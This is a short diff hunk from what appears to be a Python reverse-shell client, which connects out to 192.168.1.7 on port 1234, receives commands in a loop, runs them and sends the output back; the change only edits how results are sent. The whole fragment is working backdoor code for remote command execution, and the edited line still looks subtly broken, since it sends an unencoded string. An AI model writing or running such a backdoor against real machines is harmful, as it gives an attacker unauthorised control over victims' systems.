@@ -12,6 +12,6 @@ connection.connect(("192.168.1.7",1234))
 while(True):
     command = connection.recv(1024).decode('ascii')
     command_result = execute_commands(str(command))
-    connection.send(command_result).encode('ascii')
+    connection.send(command_result)
 
 connection.close()
